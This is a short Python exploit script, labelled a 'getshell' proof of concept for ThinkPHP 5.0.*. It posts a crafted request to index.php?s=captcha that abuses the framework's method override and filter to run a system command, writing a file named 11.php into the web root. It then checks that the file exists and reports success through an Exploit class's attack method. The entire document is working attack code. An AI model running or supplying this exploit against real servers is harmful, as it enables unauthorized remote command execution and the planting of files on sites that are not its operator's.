# thinkphp 5.0.* 通杀getshell poc_1
import requests


def post_command(host):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 > 11.php"
    }
    target = host + "/public/index.php?s=captcha"
    print("Request: {}".format(target))
    r = requests.post(target, data=data, headers=headers)
    return True


# 验证 11.php是否存在
def md5_file_is_exist(host):
    rs = requests.get(host+"/public/11.php")
    if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
        return True


class Exploit(object):

    def attack(self, url):
        post_command(url)
        if md5_file_is_exist(url):
            return "getshell ok. {}".format(url+"/public/11.php")
